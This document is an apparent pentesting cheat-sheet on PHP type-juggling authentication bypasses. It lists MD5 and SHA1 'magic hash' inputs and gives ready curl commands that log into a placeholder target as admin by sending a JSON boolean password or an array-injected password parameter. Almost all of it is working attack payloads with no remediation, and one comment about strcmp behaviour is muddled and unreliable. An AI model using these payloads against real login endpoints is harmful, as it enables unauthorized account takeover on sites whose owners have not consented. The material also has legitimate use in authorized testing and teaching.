# PHP Type Juggling Auth Bypass

PHP's loose comparison (`==`) coerces types. Common patterns:

```php
// Vulnerable: checks password hash with ==
if (md5($password) == $stored_hash) { ... }
// If stored_hash starts with "0e" followed by digits, any "magic hash" matches:
// md5("240610708") = "0e462097431906509019562988736854"
// "0e..." == "0e..." is TRUE (both treated as 0 in scientific notation)
```

Magic hashes for common algorithms:
```
MD5: "240610708" -> 0e462097431906509019562988736854
SHA1: "10932435112" -> 0e07766915004133176347055865026311692244
```

JSON type confusion — if auth reads JSON and compares loosely:
```bash
# Send: {"password": true}   instead of a string
# PHP: if ($data['password'] == $realpass) -> true == "anything" is TRUE in loose compare
curl -X POST http://<TARGET>/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":true}'
```

API auth bypass via array injection:
```bash
curl -X POST http://<TARGET>/login \
  -d 'username=admin&password[]=anything'
# PHP treats password[] as array; strcmp(array, string) = 0 = loose-false but strlen=0
```
